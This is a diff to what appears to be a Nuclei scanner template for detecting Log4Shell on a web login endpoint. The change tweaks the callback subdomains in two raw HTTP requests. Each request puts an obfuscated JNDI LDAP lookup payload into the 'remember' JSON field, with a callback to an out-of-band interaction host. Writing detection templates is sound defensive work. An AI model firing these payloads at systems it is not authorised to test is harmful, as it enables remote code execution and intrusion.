@@ -22,7 +22,7 @@ requests:
         Origin: {{RootURL}}
         Referer: {{RootURL}}/manage/account/login?redirect=%2Fmanage
 
-        {"username":"user","password":"pass","remember":"${${::,:-j}${:]:-n}${:@:-d}${::-i}:${:):-l}${:):-d}${:Chrome:-a}${:Mozilla:-p}:${:(:-/}/{{Host}}.{{interactsh-url}}/(}","strict":true}
+        {"username":"user","password":"pass","remember":"${${::,:-j}${:]:-n}${:@:-d}${::-i}:${:):-l}${:):-d}${:Chrome:-a}${:Mozilla:-p}:${:(:-/}/{{Host}}.unia.{{interactsh-url}}/(}","strict":true}
         
   - raw:
       - |
@@ -32,7 +32,7 @@ requests:
         Origin: {{RootURL}}
         Referer: {{RootURL}}/manage/account/login?redirect=%2Fmanage
 
-        {"username":"user","password":"pass","remember":"${${::,:-j}${:]:-n}${:@:-d}${::-i}:${:):-l}${:):-d}${:Chrome:-a}${:Mozilla:-p}:${:(:-/}/127.0.0.1#{{Host}}.{{interactsh-url}}/(}","strict":true}
+        {"username":"user","password":"pass","remember":"${${::,:-j}${:]:-n}${:@:-d}${::-i}:${:):-l}${:):-d}${:Chrome:-a}${:Mozilla:-p}:${:(:-/}/127.0.0.1#{{Host}}.unib.{{interactsh-url}}/(}","strict":true}
 
     matchers-condition: and
     matchers:
